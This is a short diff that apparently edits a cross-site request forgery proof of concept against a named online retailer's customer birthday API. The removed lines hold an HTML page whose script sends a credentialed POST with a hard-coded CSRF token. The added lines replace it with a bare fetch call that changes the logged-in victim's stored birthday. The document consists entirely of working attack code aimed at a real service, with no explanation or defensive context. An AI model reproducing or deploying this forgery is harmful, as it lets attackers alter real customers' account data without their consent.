@@ -1,19 +1,11 @@
-<html>
-  <body>
-    <script>
-      fetch("https://www.boozt.com/eu/en/api/customer/birthday", {
-        method: "POST",
-        credentials: "include",
-        headers: {
-          "Content-Type": "application/json",
-          "X-Requested-With": "XMLHttpRequest",
-          "Csrf-Token": "76ee94f7a6f55bf620830ad1abf30fa6"  // if static or reused
-        },
-        body: JSON.stringify({
-          birthday: "1996-06-22"
-        })
-      });
-    </script>
-  </body>
-</html>
+fetch("https://www.boozt.com/eu/en/api/customer/birthday", {
+  method: "POST",
+  credentials: "include",
+  headers: {
+    "Content-Type": "application/json"
+  },
+  body: JSON.stringify({
+    "birthday": "1999-12-31"
+  })
+});
 
